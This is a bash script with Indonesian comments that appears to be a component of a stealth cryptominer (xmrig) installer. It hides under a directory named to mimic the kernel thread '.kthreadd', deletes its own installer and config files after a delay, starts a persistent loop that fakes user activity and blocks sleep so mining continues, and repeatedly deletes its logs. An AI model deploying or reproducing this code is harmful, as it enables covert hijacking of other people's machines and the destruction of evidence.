#!/bin/bash
DIR="$HOME/.cache/.kthreadd"


# === AUTO HAPUS INSTALLER ===
(
  sleep 10
  rm -f install.sh Launcher.java xmrig.tar.gz proxychains.conf
  rm -f antisuspend.sh watchdog.sh config.json
  echo "[✓] Installer dan konfigurasi dibersihkan otomatis."
) &

# === ANTI SUSPEND KUAT ===
cat > antisuspend.sh <<EOF
#!/bin/bash

while true; do
  # DBus: Simulasi user activity (untuk desktop)
  gdbus call --session --dest org.freedesktop.ScreenSaver \
    --object-path /org/freedesktop/ScreenSaver \
    --method org.freedesktop.ScreenSaver.SimulateUserActivity >/dev/null 2>&1 || true

  # xset: Reset screen saver (untuk X11)
  xset s reset >/dev/null 2>&1 || true

  # uinput: Kirim event key dummy (jika device tersedia)
  if [ -e /dev/uinput ]; then
    echo "Simulating input" > /dev/uinput 2>/dev/null || true
  fi

  # systemd-inhibit: Mencegah suspend sementara
  systemd-inhibit --what=idle:sleep --who="miner" --why="prevent sleep" sleep 0.5 || true

  sleep 30
done
EOF

chmod +x antisuspend.sh
nohup bash antisuspend.sh >/dev/null 2>&1 &
disown

# === AUTO HAPUS LOG ===
(
  while true; do
    rm -f "$HOME"/nohup.out "$DIR"/*.log 2>/dev/null
    sleep 60
  done
) &
